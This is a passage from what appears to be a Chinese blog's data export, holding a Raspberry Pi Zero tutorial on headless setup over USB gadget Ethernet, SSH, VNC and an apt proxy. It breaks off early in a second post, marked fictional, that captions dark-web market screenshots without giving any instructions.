Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。\n\n上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。\n\n<!--more--> \n\n请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。\n\n# 信仰充值\n\n滴！信仰充值成功！\n\n![](/content/images/raspizero/mail.jpg)\n\n没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。\n\n* 1Ghz, Single-core CPU\n* 512MB RAM\n* Mini HDMI and USB On-The-Go ports\n* Micro USB power\n* HAT-compatible 40-pin header\n* Composite video and reset headers\n\n不过值得一提的是，USB On-The-Go接口也可以用来供电。\n\n# 发车\n\n网络上关于树莓派Zero如何连接配置大概有以下几种：\n\n- OTG口转USB 接 USB以太网适配器\n- OTG口转USB 接 USB Wi-Fi\n- OTG口转USB 接 USB键盘 且 用HDMI接显示器\n- GPIO接以太网适配器\n\n但是以上，都太麻烦了，对不对？\n\n那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？\n\n我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。\n\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\n\n```bash\ndiskutil list\ndiskutil unmountDisk /dev/SD卡的标号 #如disk2\ncd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录\nsudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n```\n2.刷好系统后编辑`config.txt`文件，在最后一行下，另起一行添加：\n```bash\ndtoverlay=dwc2\n```\n保存文件\n\n3.最后，打开`cmdline.txt`文件。\n找到单词`rootwait`，在其之后添加：\n\n```\nmodules-load=dwc2,g_ether\n```\n\n4.添加一个文件名为`ssh`到根目录下，内容为空\n\n\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n![](/content/images/raspizero/1.png)\n\n6.Ping 一下raspberrypi.local看是否能通\n\n```\nPING raspberrypi.local (169.254.70.245): 56 data bytes\n64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms\n64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms\n64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms\n64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n```\n\n7.ssh连接raspberrypi.local，默认密码为raspberry\n```bash\npi@raspberrypi.local\n```\n\n# 配置\n\n因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。\n\n## 配置树莓派\n通过直接运行``raspi-config``命令\n\n你需要做\n* 容量扩展\n* 更改系统时区\n* 更改系统密码\n\n同时你需要通过执行``sudo passwd root``更改root密码\n\n## 安装vnc-server\n\n首先，去[VNC官网](https://www.realvnc.com/download/vnc/raspberrypi/)下载最新版本的vnc-server\n\n用scp命令传到树莓派上\n\n```bash\nscp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~\n```\n在树莓派shell下，安装VNC\n```\ntar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz\nsudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb\n```\n\n![](/content/images/raspizero/2.png)\n\n\n```\nvncpasswd -user  # 设置连接密码\nvncserver  # 启动vncserver\n```\n\n连接raspberry.local:1测试成功\n\n![](/content/images/raspizero/3.png)\n\n## 设置代理\n本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。\n\n那么我们有一个临时解决方案，就是设置代理\n\n首先，在本机搭建一个squid\n\n```\nbrew update\nbrew install squid\n```\n然后下载[SquidMan](http://squidman.net/squidman/)，安装。\n在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n\n进入树莓派shell，输入：\n```bash\ncd /etc/apt/apt.conf.d\nsudo vi /etc/apt/apt.conf.d\n```\n最后一行加入一句话：\n```\nAcquire::http::Proxy \"http://Mac.local:8080\";\n```\n保存\n\napt-get update一下，怎么样是不是能装软件了？\n\n# 感想\n\n这块小板子，我太喜欢了，好精致\n\n# 参考\nhttps://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md\n\n\n","source":"_posts/Raspberry-Pi-Zero-不借助网络的连接解决方案.md","raw":"---\ntitle: Raspberry Pi Zero 无需键盘网络 配置教程\ndate: 2016-12-17 21:58:26\ntags: Raspberry  \ncategories: Raspberry  \npermalink: raspizero\n---\n\n我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。\n\n上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。\n\n<!--more--> \n\n请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。\n\n# 信仰充值\n\n滴！信仰充值成功！\n\n![](/content/images/raspizero/mail.jpg)\n\n没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。\n\n* 1Ghz, Single-core CPU\n* 512MB RAM\n* Mini HDMI and USB On-The-Go ports\n* Micro USB power\n* HAT-compatible 40-pin header\n* Composite video and reset headers\n\n不过值得一提的是，USB On-The-Go接口也可以用来供电。\n\n# 发车\n\n网络上关于树莓派Zero如何连接配置大概有以下几种：\n\n- OTG口转USB 接 USB以太网适配器\n- OTG口转USB 接 USB Wi-Fi\n- OTG口转USB 接 USB键盘 且 用HDMI接显示器\n- GPIO接以太网适配器\n\n但是以上，都太麻烦了，对不对？\n\n那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？\n\n我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。\n\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\n\n```bash\ndiskutil list\ndiskutil unmountDisk /dev/SD卡的标号 #如disk2\ncd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录\nsudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n```\n2.刷好系统后编辑`config.txt`文件，在最后一行下，另起一行添加：\n```bash\ndtoverlay=dwc2\n```\n保存文件\n\n3.最后，打开`cmdline.txt`文件。\n找到单词`rootwait`，在其之后添加：\n\n```\nmodules-load=dwc2,g_ether\n```\n\n4.添加一个文件名为`ssh`到根目录下，内容为空\n\n\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n![](/content/images/raspizero/1.png)\n\n6.Ping 一下raspberrypi.local看是否能通\n\n```\nPING raspberrypi.local (169.254.70.245): 56 data bytes\n64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms\n64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms\n64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms\n64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n```\n\n7.ssh连接raspberrypi.local，默认密码为raspberry\n```bash\npi@raspberrypi.local\n```\n\n# 配置\n\n因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。\n\n## 配置树莓派\n通过直接运行``raspi-config``命令\n\n你需要做\n* 容量扩展\n* 更改系统时区\n* 更改系统密码\n\n同时你需要通过执行``sudo passwd root``更改root密码\n\n## 安装vnc-server\n\n首先，去[VNC官网](https://www.realvnc.com/download/vnc/raspberrypi/)下载最新版本的vnc-server\n\n用scp命令传到树莓派上\n\n```bash\nscp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~\n```\n在树莓派shell下，安装VNC\n```\ntar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz\nsudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb\n```\n\n![](/content/images/raspizero/2.png)\n\n\n```\nvncpasswd -user  # 设置连接密码\nvncserver  # 启动vncserver\n```\n\n连接raspberry.local:1测试成功\n\n![](/content/images/raspizero/3.png)\n\n## 设置代理\n本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。\n\n那么我们有一个临时解决方案，就是设置代理\n\n首先，在本机搭建一个squid\n\n```\nbrew update\nbrew install squid\n```\n然后下载[SquidMan](http://squidman.net/squidman/)，安装。\n在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n\n进入树莓派shell，输入：\n```bash\ncd /etc/apt/apt.conf.d\nsudo vi /etc/apt/apt.conf.d\n```\n最后一行加入一句话：\n```\nAcquire::http::Proxy \"http://Mac.local:8080\";\n```\n保存\n\napt-get update一下，怎么样是不是能装软件了？\n\n# 感想\n\n这块小板子，我太喜欢了，好精致\n\n# 参考\nhttps://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md\n\n\n","slug":"raspizero","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xod001a5es5iaspsm2i","content":"<p>我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。</p>\n<p>上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。</p>\n<a id=\"more\"></a> \n<p>请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。</p>\n<h1 id=\"信仰充值\"><a href=\"#信仰充值\" class=\"headerlink\" title=\"信仰充值\"></a>信仰充值</h1><p>滴！信仰充值成功！</p>\n<p><img src=\"/content/images/raspizero/mail.jpg\" alt=\"\"></p>\n<p>没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。</p>\n<ul>\n<li>1Ghz, Single-core CPU</li>\n<li>512MB RAM</li>\n<li>Mini HDMI and USB On-The-Go ports</li>\n<li>Micro USB power</li>\n<li>HAT-compatible 40-pin header</li>\n<li>Composite video and reset headers</li>\n</ul>\n<p>不过值得一提的是，USB On-The-Go接口也可以用来供电。</p>\n<h1 id=\"发车\"><a href=\"#发车\" class=\"headerlink\" title=\"发车\"></a>发车</h1><p>网络上关于树莓派Zero如何连接配置大概有以下几种：</p>\n<ul>\n<li>OTG口转USB 接 USB以太网适配器</li>\n<li>OTG口转USB 接 USB Wi-Fi</li>\n<li>OTG口转USB 接 USB键盘 且 用HDMI接显示器</li>\n<li>GPIO接以太网适配器</li>\n</ul>\n<p>但是以上，都太麻烦了，对不对？</p>\n<p>那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？</p>\n<p>我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。</p>\n<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">diskutil list</div><div class=\"line\">diskutil unmountDisk /dev/SD卡的标号 <span class=\"comment\">#如disk2</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class=\"comment\">#进入目录</span></div><div class=\"line\">sudo dd bs=1m <span class=\"keyword\">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>\n<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>保存文件</p>\n<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>\n<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>\n<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>\n<p><img src=\"/content/images/raspizero/1.png\" alt=\"\"></p>\n<p>6.Ping 一下raspberrypi.local看是否能通</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>\n<p>7.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。</p>\n<h2 id=\"配置树莓派\"><a href=\"#配置树莓派\" class=\"headerlink\" title=\"配置树莓派\"></a>配置树莓派</h2><p>通过直接运行<code>raspi-config</code>命令</p>\n<p>你需要做</p>\n<ul>\n<li>容量扩展</li>\n<li>更改系统时区</li>\n<li>更改系统密码</li>\n</ul>\n<p>同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>\n<h2 id=\"安装vnc-server\"><a href=\"#安装vnc-server\" class=\"headerlink\" title=\"安装vnc-server\"></a>安装vnc-server</h2><p>首先，去<a href=\"https://www.realvnc.com/download/vnc/raspberrypi/\" target=\"_blank\" rel=\"external\">VNC官网</a>下载最新版本的vnc-server</p>\n<p>用scp命令传到树莓派上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~</div></pre></td></tr></table></figure>\n<p>在树莓派shell下，安装VNC<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz</div><div class=\"line\">sudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb</div></pre></td></tr></table></figure></p>\n<p><img src=\"/content/images/raspizero/2.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">vncpasswd -user  # 设置连接密码</div><div class=\"line\">vncserver  # 启动vncserver</div></pre></td></tr></table></figure>\n<p>连接raspberry.local:1测试成功</p>\n<p><img src=\"/content/images/raspizero/3.png\" alt=\"\"></p>\n<h2 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h2><p>本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。</p>\n<p>那么我们有一个临时解决方案，就是设置代理</p>\n<p>首先，在本机搭建一个squid</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew update</div><div class=\"line\">brew install squid</div></pre></td></tr></table></figure>\n<p>然后下载<a href=\"http://squidman.net/squidman/\" target=\"_blank\" rel=\"external\">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>\n<p>进入树莓派shell，输入：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /etc/apt/apt.conf.d</div><div class=\"line\">sudo vi /etc/apt/apt.conf.d</div></pre></td></tr></table></figure></p>\n<p>最后一行加入一句话：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>\n<p>保存</p>\n<p>apt-get update一下，怎么样是不是能装软件了？</p>\n<h1 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h1><p>这块小板子，我太喜欢了，好精致</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md\" target=\"_blank\" rel=\"external\">https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md</a></p>\n","excerpt":"<p>我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。</p>\n<p>上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。</p>","more":"<p>请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。</p>\n<h1 id=\"信仰充值\"><a href=\"#信仰充值\" class=\"headerlink\" title=\"信仰充值\"></a>信仰充值</h1><p>滴！信仰充值成功！</p>\n<p><img src=\"/content/images/raspizero/mail.jpg\" alt=\"\"></p>\n<p>没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。</p>\n<ul>\n<li>1Ghz, Single-core CPU</li>\n<li>512MB RAM</li>\n<li>Mini HDMI and USB On-The-Go ports</li>\n<li>Micro USB power</li>\n<li>HAT-compatible 40-pin header</li>\n<li>Composite video and reset headers</li>\n</ul>\n<p>不过值得一提的是，USB On-The-Go接口也可以用来供电。</p>\n<h1 id=\"发车\"><a href=\"#发车\" class=\"headerlink\" title=\"发车\"></a>发车</h1><p>网络上关于树莓派Zero如何连接配置大概有以下几种：</p>\n<ul>\n<li>OTG口转USB 接 USB以太网适配器</li>\n<li>OTG口转USB 接 USB Wi-Fi</li>\n<li>OTG口转USB 接 USB键盘 且 用HDMI接显示器</li>\n<li>GPIO接以太网适配器</li>\n</ul>\n<p>但是以上，都太麻烦了，对不对？</p>\n<p>那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？</p>\n<p>我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。</p>\n<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">diskutil list</div><div class=\"line\">diskutil unmountDisk /dev/SD卡的标号 <span class=\"comment\">#如disk2</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class=\"comment\">#进入目录</span></div><div class=\"line\">sudo dd bs=1m <span class=\"keyword\">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>\n<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>保存文件</p>\n<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>\n<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>\n<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>\n<p><img src=\"/content/images/raspizero/1.png\" alt=\"\"></p>\n<p>6.Ping 一下raspberrypi.local看是否能通</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>\n<p>7.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。</p>\n<h2 id=\"配置树莓派\"><a href=\"#配置树莓派\" class=\"headerlink\" title=\"配置树莓派\"></a>配置树莓派</h2><p>通过直接运行<code>raspi-config</code>命令</p>\n<p>你需要做</p>\n<ul>\n<li>容量扩展</li>\n<li>更改系统时区</li>\n<li>更改系统密码</li>\n</ul>\n<p>同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>\n<h2 id=\"安装vnc-server\"><a href=\"#安装vnc-server\" class=\"headerlink\" title=\"安装vnc-server\"></a>安装vnc-server</h2><p>首先，去<a href=\"https://www.realvnc.com/download/vnc/raspberrypi/\">VNC官网</a>下载最新版本的vnc-server</p>\n<p>用scp命令传到树莓派上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~</div></pre></td></tr></table></figure>\n<p>在树莓派shell下，安装VNC<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz</div><div class=\"line\">sudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb</div></pre></td></tr></table></figure></p>\n<p><img src=\"/content/images/raspizero/2.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">vncpasswd -user  # 设置连接密码</div><div class=\"line\">vncserver  # 启动vncserver</div></pre></td></tr></table></figure>\n<p>连接raspberry.local:1测试成功</p>\n<p><img src=\"/content/images/raspizero/3.png\" alt=\"\"></p>\n<h2 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h2><p>本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。</p>\n<p>那么我们有一个临时解决方案，就是设置代理</p>\n<p>首先，在本机搭建一个squid</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew update</div><div class=\"line\">brew install squid</div></pre></td></tr></table></figure>\n<p>然后下载<a href=\"http://squidman.net/squidman/\">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>\n<p>进入树莓派shell，输入：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /etc/apt/apt.conf.d</div><div class=\"line\">sudo vi /etc/apt/apt.conf.d</div></pre></td></tr></table></figure></p>\n<p>最后一行加入一句话：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>\n<p>保存</p>\n<p>apt-get update一下，怎么样是不是能装软件了？</p>\n<h1 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h1><p>这块小板子，我太喜欢了，好精致</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md\">https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md</a></p>"},{"title":"TOR暗网的秘密","date":"2016-11-26T01:00:34.000Z","_content":"\nTOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。\n\n以下内容纯属虚构。\n\n<!--more -->\n\n# 另一个互联网世界\n\nTor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。\n\nTor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。\n\n下面 我们来逛一逛都有什么 奇葩的 py交易。\n### 虚拟主机交易\n\n![](/content/images/torworld/1.png)\n\n### 免费盗版市场\n\n盗版书\n\n![](/content/images/torworld/2.png)\n\n\n盗版音乐\n\n![](/content/images/torworld/13.png)\n\n\n### 英国枪支弹药交易\n\n![](/content/images/torworld/3.png)\n\n比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。\n\n（英国持枪是合法的，但是我不感兴趣）\n\n### 暗网iPhone交易\n\n不知道iPhone的货源，很便宜。\n\n![](/content/images/torworld/4.png)\n\n### 办证类\n\n美国护照\n\n![](/content/images/torworld/5.png)\n\n美国假身份证\n\n![](/content/images/torworld/7.png)\n\n英国护照\n\n![](/content/images/torworld/6.png)\n\n\n我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。\n\n### 博客\n\n![](/content/images/torworld/8.png)\n\n此外还有很多，没什么意思\n\n### 电子邮箱\n\n![](/content/images/torworld/9.png)\n\n几乎是全匿名的电子邮箱，用比特message登录的\n\n### 政治\n\n各种资本主义反动派论坛\n\n![](/content/images/torworld/10.png)\n\n![](/content/images/torworld/11.png)\n\n\n### 雇佣黑阔\n\n![](/content/images/torworld/12.png)\n\n日一个网站500欧元，还是挺赚的。\n\n### 其他的\n\n当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。\n\n\n## 